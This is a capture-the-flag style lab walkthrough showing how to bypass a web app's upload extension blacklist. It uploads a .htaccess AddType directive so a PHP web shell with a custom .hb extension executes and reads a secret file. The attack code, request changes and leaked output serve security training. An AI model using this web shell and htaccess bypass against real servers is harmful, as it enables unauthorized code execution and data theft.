# Lab "Web shell upload via extension blacklist bypass"

**Request**:
Upload a PHP web shell, and exfiltrate the contents of the file `/home/carlos/secret`.

After logging in we see there is an option to upload our avatars.

I created a file that will be used to get the contents of the file that we are interested to read.

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

But, the upload was not successful, as it showed that `.php` files are not allowed to be uploaded.

When observing the response on the Burp Suite, we see that it uses `Apache`, so now let's try to modify the `.htaccess` file.

On the request to upload the php file that failed, change the:
- `filename` - to `.htaccess`
- `Content-type` - to `text/plain`.

and then replace the content of the file that is being uploaded with the following Apache directive:
```apache
AddType application/x-httpd-php .hb
```

This basically maps:
- extension `.hb` to the executable MIME type `application/x-httpd-php`.

Now, let's try to open again the file, but now change the name from `exploit.php` to `exploit.hb`.

After uploading, refresh the page, and observe the history on burp suite to check the location of the file after the upload was successul, and we see a request which was to:
`/files/avatars/exploit.hb`.

Send that request to the repeater and see the response, which will have the content of the file that we wanted to read:
```http
HTTP/2 200 OK
Date: Fri, 17 Oct 2025 22:59:15 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

KPAeqBaSNanokEPN8o4WaLVwBz4dV8f9
```